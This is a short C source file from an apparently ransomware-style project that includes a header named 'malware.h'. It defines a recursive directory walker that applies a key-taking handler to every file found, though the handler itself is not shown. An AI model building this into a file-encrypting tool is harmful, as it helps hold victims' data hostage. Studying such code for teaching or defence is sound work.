#include "../includes/malware.h"

int handle_files(char *path, unsigned char *key, int (*handler)(char *, unsigned char *)) {
    DIR				*dir;
    struct dirent	*entry;
    struct stat		file_stat;

    if ((dir = opendir(path)) == NULL)
        return (error("cannot open this directory"), -1);
	
    char *buffer = malloc(sizeof(char) * BUFFER_SIZE);
	if (!buffer)
		return (closedir(dir), error("buffer malloc()"), -1);

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
            continue;
        }

        snprintf(buffer, BUFFER_SIZE, "%s/%s", path, entry->d_name);

        if (lstat(buffer, &file_stat) < 0)
			return (free(buffer), closedir(dir), error("getting file infos"), -1);

        if (S_ISDIR(file_stat.st_mode)) {
            if (handle_files(buffer, key, handler) == -1)
				return (free(buffer), closedir(dir), -1);
        } else if (handler(buffer, key) == -1) {
            return (closedir(dir), -1);
        }
    }

    return (free(buffer), closedir(dir), 0);
}